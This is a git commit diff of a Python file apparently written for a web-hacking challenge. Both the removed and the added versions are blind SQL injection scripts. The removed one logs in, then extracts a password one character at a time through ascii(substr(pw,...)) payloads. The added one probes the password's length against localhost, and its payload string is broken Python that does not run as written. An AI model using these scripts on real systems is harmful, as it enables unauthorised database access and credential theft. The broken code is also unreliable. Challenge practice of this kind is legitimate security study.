7044bccceb30eb4061023336d9dc9ecae119d59e
MtucX <phpbug1995@gmail.com>
2017-02-27 12:11:23 +0100

    Update web3.py

--- python/web3.py
+++ python/web3.py
@@ -1,18 +1,16 @@
-#web challenge MtucX
-import urllib, urllib2
-
-req = urllib2.Request('http://........./', 'username=.....&pwd=.....')
-res = urllib2.urlopen(req)
-session = res.headers.get('Set-Cookie')
-
-password=""
-for i in range(1, 20):
-	for j in range(97, 128):
-		req = urllib2.Request('http://...../index.php?no=2%20and%20ascii(substr(pw,'+str(i)+',1))='+str(j)+'%23id=&pw=')
-		req.add_header('cookie',session)
-		res = urllib2.urlopen(req)
-		if res.read().find('True') != -1:
-			print chr(j)
-			password+=chr(j)
-			break
-print password
+import httplib
+import urllib
+result=''
+string="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-=+"
+target = 'localhost'
+headers={'Cookie':'PHPSESSID=','Content-Type':'application/x-www-form-urlencoded'}
+for i in range(1,100) :
+    hh ='index.php?id=' or LENGTH(pw)='+str(i)+'%23'
+    conn=httplib.HTTPConnection(target)
+    conn.request('GET',hh,'',headers)
+    data=conn.getresponse().read()
+    print i
+    if 'admins' in data:
+        length = i
+        print "inject length : "+str(i)
+        break
